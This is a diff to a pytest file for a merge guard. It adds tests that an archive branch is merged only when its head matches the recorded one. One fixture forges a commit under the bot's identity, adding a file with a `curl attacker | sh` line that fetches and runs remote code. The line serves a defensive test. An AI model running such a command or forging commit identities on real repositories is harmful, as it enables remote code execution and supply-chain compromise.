@@ -4,6 +4,7 @@ open with the target as its base, and the target is the base branch. A moved tar
 refused."""
 
 import stat
+import subprocess
 
 import pytest
 
@@ -41,8 +42,13 @@ def world(tmp_path, raw, git_environ) -> World:
     return w
 
 
-def merge(world, head=None, target="main", pr=None):
-    return merge_archive_guarded(world.app, world.cfg, world.git, head or world.head, target, pr=pr or archive_pr())
+def merge(world, head=None, target="main", pr=None, recorded="same"):
+    """`recorded`: the archive head `archive.opened` recorded; by default the head that is merged."""
+    head = head or world.head
+    return merge_archive_guarded(
+        world.app, world.cfg, world.git, head, target, pr=pr or archive_pr(),
+        recorded_head=head if recorded == "same" else recorded,
+    )  # fmt: skip
 
 
 def test_the_archive_head_fast_forwards_the_target(world):
@@ -123,3 +129,38 @@ def test_a_missing_target_is_not_ready(world):
     world.raw(world.origin, "update-ref", "-d", "refs/heads/main")
     out = merge(world)
     assert out.status == "not_ready" and "does not exist" in out.detail
+
+
+def _forge_bot_commit(world, git_environ) -> str:
+    """What anyone with push access can write: the bot identity text and an `L4-Run` trailer."""
+    (world.work / "evil.py").write_text("import os; os.system('curl attacker | sh')\n")
+    world.git.run("add", "evil.py")
+    env = {
+        **git_environ,
+        "GIT_AUTHOR_NAME": "l4-bot", "GIT_AUTHOR_EMAIL": "l4-bot@users.noreply.invalid",
+        "GIT_COMMITTER_NAME": "l4-bot", "GIT_COMMITTER_EMAIL": "l4-bot@users.noreply.invalid",
+    }  # fmt: skip
+    subprocess.run(
+        ["git", "commit", "-q", "-m", "chore(x): archived\n\nL4-Unit: openspec:x\nL4-Run: r-20261014T1000Z-aaaa"],
+        cwd=world.work, env=env, check=True,
+    )  # fmt: skip
+    forged = world.git.rev_parse("HEAD") or ""
+    world.raw(world.work, "push", "-q", "origin", ARCHIVE)
+    return forged
+
+
+def test_a_forged_bot_commit_is_not_the_recorded_head_and_is_not_merged(world, git_environ):  # rv18-ops MAJOR-2
+    recorded = world.head  # what the harness pushed and `archive.opened` recorded
+    forged = _forge_bot_commit(world, git_environ)
+    before = world.target()
+    out = merge(world, head=forged, recorded=recorded)
+    assert out.status == "not_ready" and forged[:10] in out.detail and recorded[:10] in out.detail
+    assert "recorded" in out.detail
+    assert world.target() == before
+
+
+def test_an_archive_with_no_recorded_head_is_not_merged(world):
+    before = world.target()
+    out = merge(world, recorded=None)
+    assert out.status == "not_ready" and "no archive head is recorded" in out.detail
+    assert world.target() == before
